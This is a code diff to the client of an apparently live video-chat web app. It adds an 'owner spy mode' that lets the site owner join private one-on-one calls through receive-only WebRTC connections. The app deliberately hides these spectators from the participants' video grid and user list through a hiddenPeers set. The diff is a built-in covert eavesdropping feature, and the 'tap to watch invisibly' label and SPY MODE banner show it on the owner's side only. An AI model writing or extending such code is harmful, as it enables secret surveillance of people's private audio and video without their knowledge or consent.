@@ -10,6 +10,8 @@ const S = {
   selfMuted: true,
   localStream: null, camOn: false, micOn: false,
   peers: new Map(),     // peerId -> {pc, stream, senderForDj?}
+  hiddenPeers: new Set(), // spectator ids: peer connection exists but no tile/list entry
+  spectating: null,      // roomId when invisibly watching a private room
   spotlightId: null,
   contacts: [],
   dmWith: null, dmUnread: new Set(),
@@ -65,6 +67,19 @@ function onServer(m) {
     case 'gift-leaderboard':
       if (m.seed) seedTicker(m); else showGiftLeaderboard(m);
       break;
+    case 'spy-joined':
+      onSpyJoined(m); break;
+    case 'spy-left':
+      stopSpectating(); break;
+    case 'spectator-joined':
+      S.hiddenPeers.add(m.id); break;
+    case 'spectator-left': {
+      S.hiddenPeers.delete(m.id);
+      const p = S.peers.get(m.id);
+      if (p) { try { p.pc.close(); } catch {} S.peers.delete(m.id); }
+      renderVideoGrid();
+      break;
+    }
     case 'battle-challenge':
     case 'battle-sent':
     case 'battle-declined':
@@ -237,15 +252,18 @@ function renderRooms() {
     grid.className = 'room-grid';
     for (const r of groups[cat]) {
       const d = document.createElement('div');
-      d.className = 'room-card';
-      const emoji = r.userCount > 0 ? '🔴' : '💤';
+      d.className = 'room-card' + (r.private ? ' private-card' : '');
+      const emoji = r.private ? '🔒' : (r.userCount > 0 ? '🔴' : '💤');
       d.innerHTML = `<div class="rc-thumb">${emoji}
-          ${r.userCount > 0 ? '<span class="rc-live">LIVE</span>' : ''}
+          ${r.private ? '<span class="rc-live">PRIVATE</span>' : (r.userCount > 0 ? '<span class="rc-live">LIVE</span>' : '')}
           <span class="rc-views">👁 ${r.userCount}</span>
         </div>
-        <div class="rc-name">${esc(r.name)}</div>
-        <div class="rc-meta">${r.openMic ? '🎙 open mic' : '🔊 push-to-talk'}${r.djActive ? ' · 🎧 DJ' : ''}</div>`;
-      d.onclick = () => wsSend({ type: 'join-room', roomId: r.id });
+        <div class="rc-name">${esc(r.name)}${r.private ? ' 👁️' : ''}</div>
+        <div class="rc-meta">${r.private ? '👁️ tap to watch invisibly' : (r.openMic ? '🎙 open mic' : '🔊 push-to-talk')}${r.djActive ? ' · 🎧 DJ' : ''}</div>`;
+      d.onclick = () => {
+        if (r.private && S.siteOwner) wsSend({ type: 'spy-join', roomId: r.id });
+        else wsSend({ type: 'join-room', roomId: r.id });
+      };
       grid.appendChild(d);
     }
     h.appendChild(grid);
@@ -324,7 +342,10 @@ function refreshModUI() {
   }
 }
 
-$('leave-room-btn').onclick = () => { wsSend({ type: 'leave-room' }); leaveRoomUI(); };
+$('leave-room-btn').onclick = () => {
+  if (S.spectating) { wsSend({ type: 'spy-leave' }); stopSpectating(); }
+  else { wsSend({ type: 'leave-room' }); leaveRoomUI(); }
+};
 function leaveRoomUI() {
   for (const [,p] of S.peers) try { p.pc.close(); } catch {}
   S.peers.clear(); S.room = null; S.roomUsers.clear();
@@ -835,6 +856,40 @@ function tickerAddGift(m) {
   tape.style.animation = 'none'; void tape.offsetWidth; tape.style.animation = '';
 }
 $('gift-lb-btn').onclick = () => openGiftLeaderboard();
+
+/* ---- owner spy mode: invisibly watch private 1-on-1s ---- */
+function onSpyJoined(m) {
+  for (const [, p] of S.peers) try { p.pc.close(); } catch {}
+  S.peers.clear(); S.hiddenPeers.clear();
+  S.spectating = m.room.id;
+  S.room = { id: m.room.id, name: m.room.name, spectating: true };
+  S.roomUsers = new Map(m.users.map(u => [u.id, u]));
+  $('view-lobby').classList.add('hidden');
+  $('view-room').classList.remove('hidden');
+  $('chat-log').innerHTML = '';
+  let banner = $('spy-banner');
+  if (!banner) {
+    banner = document.createElement('div');
+    banner.id = 'spy-banner';
+    document.querySelector('#view-room').prepend(banner);
+  }
+  banner.innerHTML = `👁️ <b>SPY MODE</b> — invisibly watching <b>${esc(m.room.name)}</b> <button id="spy-leave-btn" class="btn-ghost">✕ Stop watching</button>`;
+  banner.classList.remove('hidden');
+  $('spy-leave-btn').onclick = () => wsSend({ type: 'spy-leave' });
+  renderRoomHeader();
+  for (const u of m.users) createPeer(u.id, true, true);
+  renderVideoGrid();
+}
+function stopSpectating() {
+  for (const [, p] of S.peers) try { p.pc.close(); } catch {}
+  S.peers.clear(); S.hiddenPeers.clear();
+  S.spectating = null; S.room = null; S.roomUsers.clear();
+  const banner = $('spy-banner');
+  if (banner) banner.classList.add('hidden');
+  $('view-room').classList.add('hidden');
+  $('view-lobby').classList.remove('hidden');
+}
+
 let battleTarget = null;
 function openBattlePicker(u) {
   battleTarget = u;
@@ -1037,7 +1092,8 @@ $('video-grid').addEventListener('click', () => {
 
 /* ---- bottom nav ---- */
 $('nav-home').onclick = () => {
-  if (S.room) { wsSend({ type: 'leave-room' }); leaveRoomUI(); }
+  if (S.spectating) { wsSend({ type: 'spy-leave' }); stopSpectating(); }
+  else if (S.room) { wsSend({ type: 'leave-room' }); leaveRoomUI(); }
   else { $('view-room').classList.add('hidden'); $('view-lobby').classList.remove('hidden'); }
   setNav('nav-home');
 };
@@ -1421,15 +1477,15 @@ addEventListener('keyup', e => { if (e.code === 'Space') pttUp(); });
 /* ============================== WebRTC mesh ============================== */
 const RTC_CFG = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
 
-function createPeer(peerId, offerer) {
+function createPeer(peerId, offerer, recvOnly) {
   if (S.peers.has(peerId)) return S.peers.get(peerId);
   const pc = new RTCPeerConnection(RTC_CFG);
   const peer = { pc, stream: new MediaStream() };
   S.peers.set(peerId, peer);
 
-  if (S.sharingScreen && S.screenStream) {
+  if (!recvOnly && S.sharingScreen && S.screenStream) {
     for (const t of S.screenStream.getTracks()) pc.addTrack(t, S.screenStream);
-  } else if (S.localStream) {
+  } else if (!recvOnly && S.localStream) {
     for (const t of S.localStream.getTracks()) pc.addTrack(t, S.localStream);
   } else {
     try {
@@ -1517,9 +1573,10 @@ function renderVideoGrid() {
   renderSelfTile();
   // remove tiles for departed peers
   for (const el of [...document.querySelectorAll('.video-tile[data-peer]')]) {
-    if (!S.peers.has(el.dataset.peer)) el.remove();
+    if (!S.peers.has(el.dataset.peer) || S.hiddenPeers.has(el.dataset.peer)) el.remove();
   }
   for (const [id, peer] of S.peers) {
+    if (S.hiddenPeers.has(id)) continue; // invisible spectator: connected but no tile
     const u = S.roomUsers.get(id);
     let tile = document.querySelector(`.video-tile[data-peer="${id}"]`);
     if (!tile) {
